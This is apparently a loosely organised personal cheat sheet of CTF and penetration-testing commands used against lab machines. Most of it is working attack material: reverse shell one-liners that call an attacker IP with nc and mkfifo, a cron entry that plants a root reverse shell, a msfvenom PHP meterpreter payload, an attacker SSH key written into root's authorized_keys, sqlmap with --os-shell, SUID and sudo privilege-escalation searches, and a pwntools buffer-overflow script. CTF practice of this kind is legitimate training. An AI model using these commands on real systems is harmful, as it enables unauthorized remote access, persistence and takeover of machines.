Just a grab-bag of useful Hacking & CTF commands, tools, resources, etc. Not at
all well organized or curated.

# Shells

```sh
python -c 'import pty; pty.spawn("/bin/sh")'
echo '* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.34 4444 >/tmp/f ' >> crontab
nc 10.10.14.35 4444 -e "/bin/sh"

msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.35 LPORT=4444 -f raw > shell.php
use exploit/multi/handler
set LHOST 10.10.14.35
exploit

# Turn a nc shell into a real one
SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm
# alternate methods
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
```

# Fuzzing
```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -x txt,php -s 200,204,301,302,307 -u http://curling.htb
wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404,403 -u "http://blunder.htb/FUZZ.txt" -t 100
dotdotpwn -m http-url -u "http://base.htb/TRAVERSAL" -k "root:" -r base.txt

# Scan using a cookie, add --os-shell option once we find it's exploitable
sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls"

# build wordlist of page content
cewl -w passwords.txt -d 10 -m 1 http://blunder.htb/
```

# Enumeration

## Find interesting files
```
sudo -l # find what can be run as sudo (use to get root)
find / -type f -group user-privileged 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm /4000 -group bugtracker 2>/dev/null
find / -type f -writable 2>/dev/null
find / -writable 2>/dev/null

find / -group user1 2>/dev/null | grep -v -E '(proc|dev)'

find / -perm -u=s -type f 2>/dev/null
# files changed in last x mins
find / -mmin -10 2>/dev/null | grep -v -E 'sys|dev|proc'
```

## Tools

- LinEnum.sh : automatic enum
- linpeas.sh : automatic enum
- pspy64     : watch what processes are running with what perms

# Persistence
```
echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC7MftBcfwoEUjj6jThv5vLHq4xCwILUoKafhN0dyJht kali@kali > ~/.ssh/authorized_keys
echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC7MftBcfwoEUjj6jThv5vLHq4xCwILUoKafhN0dyJht kali@kali > /mnt/root/root/.ssh/authorized_keys
```

# Tools
- https://github.com/ffuf/ffuf
- RustScan/RustScan
- https://gtfobins.github.io/
- https://gtfobins.github.io/

# Misc
- https://gchq.github.io/CyberChef/

# Windows...
```
# Stable windows meterpreter shell
1. Upload netcat to box
2. Setup listener `nc -lvp 1234`
2. Run: execute -f nc.exe -a "-e cmd.exe 10.10.14.2 1234"
```

# Find in any binary
find . -type f -exec cat {} \; | strings | grep "FwordCTF"

# Pwning

pwntools
```
aslr	Inspect or modify ASLR status
checksec	Prints out the binary security settings using checksec.
elfheader	Prints the section mappings contained in the ELF header.
hexdump	Hexdumps data at the specified address (or at $sp).
main	GDBINIT compatibility alias for main command.
nearpc	Disassemble near a specified address.
nextcall	Breaks at the next call instruction.
nextjmp	Breaks at the next jump instruction.
nextjump	Breaks at the next jump instruction.
nextret	Breaks at next return-like instruction.
nextsc	Breaks at the next syscall not taking branches.
nextsyscall	Breaks at the next syscall not taking branches.
pdisass	Compatibility layer for PEDA's pdisass command.
procinfo	Display information about the running process.
regs	Print out all registers and enhance the information.
stack	Print dereferences on stack data.
search	Search memory for bytes, strings, pointers, and integers.
telescope	Recursively dereferences pointers.
vmmap	Print virtual memory map pages.
```

```
def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(200, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {} ({}-byte architecture)".format(offset, exe.bytes))
    return offset

io = start()
payload = fit({overflow_offset: exe.symbols["main"]}, filler = 'B')
log.info("Sending payload: \n{}".format(hexdump(payload)))
send_payload(io, payload)
payload = fit({overflow_offset: exe.symbols["flag"]}, filler = 'B')
log.info("Sending payload: \n{}".format(hexdump(payload)))
send_payload(io, payload)


# Finding libc offsets
readelf -s  /lib/x86_64-linux-gnu/libc.so.6 | grep "system@@"
strings -t x -a t/lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"

$ ldd ./vuln
        linux-vdso.so.1 (0x00007fff7acab000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007eff7b3b7000)
        /lib64/ld-linux-x86-64.so.2 (0x00007eff7b7a8000)
$ ldd --version
ldd (Ubuntu GLIBC 2.27-3ubuntu1.2) 2.27

https://github.com/Naetw/CTF-pwn-tips#predictable-rngrandom-number-generator
```
